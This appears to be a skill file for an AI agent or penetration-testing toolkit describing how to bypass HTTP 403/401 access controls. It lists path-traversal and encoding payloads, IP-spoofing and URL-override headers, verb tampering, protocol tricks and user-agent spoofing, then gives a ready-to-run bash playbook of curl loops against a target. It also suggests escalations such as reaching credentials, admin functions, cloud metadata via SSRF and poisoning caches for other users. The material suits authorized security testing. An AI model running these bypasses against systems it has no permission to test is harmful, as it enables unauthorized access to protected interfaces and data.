---
name: 403-bypass
description: Systematic 403/401 bypass via header spoofing, path manipulation, verb tampering, and protocol tricks. Use when endpoint returns 403/401 and you suspect ACL enforcement at proxy/WAF layer rather than application layer.
---

# 403 Bypass

## When to Use
- Endpoint returns 403/401 and you suspect the block is at proxy/WAF/CDN, not application code
- Admin or internal paths discovered via JS analysis, wordlisting, or sitemap
- Different status codes for same resource under different conditions (layered enforcement signal)

## Triage First
Before spraying payloads, determine WHERE the 403 originates:
1. **Response body/headers** -- WAF signature (Cloudflare, Akamai, Imperva, custom error page) vs framework error
2. **Timing** -- instant 403 = proxy/WAF rule; delayed 403 = app-level auth check
3. **Consistency** -- same 403 for all methods/paths = blanket rule; varies per path = ACL
4. **Response size** -- baseline the 403 response size. Any size change during testing = different code path hit

WAF/proxy-level blocks are bypassable. App-level `if (!user.isAdmin) return 403` generally is not.

## Interpreting Results
Status code alone is insufficient. Compare **status code + response body size + response time**:
- Same status, different size = backend processed differently (investigate body)
- 200 with same size as 403 = may be a generic error page, read the body
- 302/301 = auth redirect, not a bypass
- 500 = backend choked on your input, good signal for parser differential
- Different timing = different code path, even if same status

## Techniques (ordered by real-world hit rate)

### 1. Path Manipulation
Core idea: ACL checks the raw path, backend normalizes before routing.

**CRITICAL**: Use `--path-as-is` with curl to prevent client-side normalization of `/../` sequences.

**Traversal insertion** (inject at every `/` boundary):
```
/admin → /x/../admin             # basic traversal
/admin → /x/..;/admin            # Java/Tomcat ; as path parameter separator
/admin → /x/..;//admin           # double separator
/admin → /.;/admin               # Spring Framework specific
/admin → /./admin                # dot segment
/admin → //admin                 # double-slash normalization
/admin → /admin/./               # trailing dot segment
```

**Encoding layers** (WAF decodes N times, backend decodes N+1):
```
/admin → /%61dmin                # single-encode one char at a time
/admin → /%2561dmin              # double-encode
/admin → /a%64min                # encode different char positions
/admin → /admin%00               # null byte terminator
/admin → /admin%20               # trailing space
/admin → /admin%09               # trailing tab
/admin → /admin%0d%0a            # CRLF
```

**Suffix tricks** (change path classification or parser behavior):
```
/admin → /admin/                 # trailing slash
/admin → /admin..;/              # Tomcat path parameter
/admin → /admin;.css             # extension whitelist bypass (Nginx)
/admin → /admin;jsessionid=x     # Java session parameter
/admin → /admin?.css             # query string before extension check
/admin → /admin/.                # dot normalization
/admin → /admin/..;/admin        # self-referencing traversal
/admin → /admin;                 # bare semicolon
```

**Overlong UTF-8** (WAFs that don't normalize Unicode):
```
/  → %c0%af                     # 2-byte overlong slash
/  → %e0%80%af                  # 3-byte overlong slash
/  → %f0%80%80%af               # 4-byte overlong slash
a  → %c1%a1                     # 2-byte overlong 'a'
```

**Unicode fullwidth**:
```
/admin → /%ef%bc%8fadmin         # U+FF0F fullwidth solidus as /
```

**Case permutation** (if ACL is case-sensitive):
```
/admin → /Admin → /ADMIN → /aDmIn
```

### 2. Header Injection

**IP spoofing** -- trick reverse proxy into treating request as internal origin.
Test each with: `127.0.0.1`, `10.0.0.1`, `0.0.0.0`, `localhost`, `::1`
```
X-Forwarded-For             X-Real-IP                X-Client-IP
X-Originating-IP            X-Remote-Addr            X-Remote-IP
CF-Connecting-IP            True-Client-IP           Fastly-Client-IP
X-Azure-ClientIP            X-Cluster-Client-IP      X-Custom-IP-Authorization
Forwarded: for=127.0.0.1
```

**Path override** -- ACL checks request path, backend routes from header:
```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Path: /admin
```
**Split technique**: `GET /` with `X-Original-URL: /admin` -- ACL sees `/`, backend routes `/admin`.
Reverse split: `GET /admin` with `X-Original-URL: /` -- test both directions.

**Host header tricks**:
```
Host: localhost                        # internal vhost
Host: internal.target.com             # alternate vhost
Host: target.com:8080                 # port-based routing
X-Forwarded-Host: internal.target.com
X-Host: localhost
```
Duplicate Host header (proxy uses first, backend uses second):
```
Host: allowed.com
Host: target.com
```

**Port/scheme override** -- change virtual host routing:
```
X-Forwarded-Port: 8080              # internal port
X-Forwarded-Port: 443               # force HTTPS routing
X-Forwarded-Proto: https
X-Forwarded-Scheme: http
```

### 3. Method Tampering

**Verb switching** -- ACL may only block specific methods:
```
GET /admin 403 → POST, PUT, PATCH, DELETE, OPTIONS, HEAD
GET /admin 403 → TRACE, PROPFIND, MOVE, COPY, SEARCH
```

**Method override headers** (send POST, backend treats as override value):
```
POST /admin with X-HTTP-Method-Override: GET
POST /admin with X-Method-Override: PUT
POST /admin with X-HTTP-Method: PATCH
```

**Case permutation** (case-sensitive method matching):
```
GET → get → Get → gEt
```

**Non-standard verbs** (bypass method allow-lists):
```
POUET, PRI, QUERY, PURGE, LINK
```

### 4. Protocol-Level

**HTTP version downgrade**:
```bash
curl --http1.0 --path-as-is -x localhost:8080 -k https://target/admin
```

**Absolute URI in request line** (proxy vs origin disagree on path):
```
GET http://localhost/admin HTTP/1.1
GET https://target:8443/admin HTTP/1.1
```

**Body stuffing** (exceed WAF inspection buffer, 8KB+):
```bash
curl -X POST --path-as-is -x localhost:8080 -k \
  -d "$(python3 -c 'print("A"*8192)')" https://target/admin
```

**Trim inconsistency** (control chars parsers disagree on):
Append `%09`, `%0c`, `%1c`, `%1f`, `%85`, `%a0` to path -- different parsers treat these as whitespace/terminators differently.

### 5. User-Agent Spoofing
Some WAFs whitelist crawlers or internal service agents:
```
Googlebot/2.1 (+http://www.google.com/bot.html)
Mozilla/5.0 (compatible; bingbot/2.0)
Go-http-client/1.1
```

### 6. Combining Techniques
Single techniques fail more often than combinations. When you get a signal (different size, timing, or status), stack:
- Path manipulation + header injection simultaneously
- Method override + path traversal
- HTTP/1.0 downgrade + IP spoofing header
- Body stuffing + method override + path encoding

## Execution Playbook

```bash
TARGET="https://target.com"
PATH="/admin"
PROXY="-x localhost:8080 -k"

# Step 1: Baseline (record status + size)
curl -sk --path-as-is $PROXY -o /dev/null -w "%{http_code} %{size_download}\n" "${TARGET}${PATH}"

# Step 2: Path manipulation quick wins
for p in "${PATH}/" "${PATH}/." "${PATH}..;/" "/${PATH#/}%20" "/${PATH#/}%09" \
         "//$(echo $PATH | cut -c2-)" "/x/../${PATH#/}" "/.;/${PATH#/}" \
         "/${PATH#/};.css" "/${PATH#/}%00"; do
  printf "%-40s" "$p"
  curl -sk --path-as-is $PROXY -o /dev/null -w "%{http_code} %{size_download}\n" "${TARGET}${p}"
done

# Step 3: Header injection
for h in "X-Forwarded-For: 127.0.0.1" "X-Original-URL: ${PATH}" \
         "X-Rewrite-URL: ${PATH}" "X-Real-IP: 127.0.0.1" \
         "X-Forwarded-Host: localhost"; do
  printf "%-40s" "$h"
  curl -sk --path-as-is $PROXY -H "$h" -o /dev/null -w "%{http_code} %{size_download}\n" "${TARGET}${PATH}"
done

# Step 4: Method tampering
for m in POST PUT PATCH DELETE OPTIONS HEAD TRACE PROPFIND; do
  printf "%-12s" "$m"
  curl -sk --path-as-is $PROXY -X "$m" -o /dev/null -w "%{http_code} %{size_download}\n" "${TARGET}${PATH}"
done

# Step 5: Encoding escalation (run when steps 2-4 show ANY size/status differential)
curl -sk --path-as-is $PROXY -o /dev/null -w "%{http_code} %{size_download}\n" "${TARGET}/%61dmin"
curl -sk --path-as-is $PROXY -o /dev/null -w "%{http_code} %{size_download}\n" "${TARGET}/%2561dmin"
curl -sk --path-as-is $PROXY -o /dev/null -w "%{http_code} %{size_download}\n" "${TARGET}/x/..;/${PATH#/}"

# Step 6: Combine (if any individual technique showed signal)
curl -sk --path-as-is $PROXY -H "X-Forwarded-For: 127.0.0.1" \
  -o /dev/null -w "%{http_code} %{size_download}\n" "${TARGET}/x/../${PATH#/}"
```

## Escalation
A 403 bypass alone may be informational. To make it reportable:
- **Data exposure**: Does the bypassed path leak PII, configs, credentials, source code?
- **Action abuse**: Can you invoke admin functions (user mgmt, config changes, data deletion)?
- **Chain with auth**: Combine with IDOR, privilege escalation, or session manipulation
- **Chain with SSRF**: Internal path access → cloud metadata or internal service interaction
- **Cache the bypass**: If cacheable, other users receive the bypassed response (web cache deception)

## Chain With
- parser-differential-bypass (proxy/backend path interpretation mismatch)
- apache-confusion-attacks (Apache httpd path ambiguities)
- unicode-normalization-bypass (WAF blocks ASCII, backend normalizes Unicode)
- web-cache-deception-path (cache the bypassed response for victim access)

## References
- https://github.com/devploit/nomore403
- https://github.com/caido-community/Caido403Bypasser
- https://blog.bugport.net/exploiting-http-parsers-inconsistencies
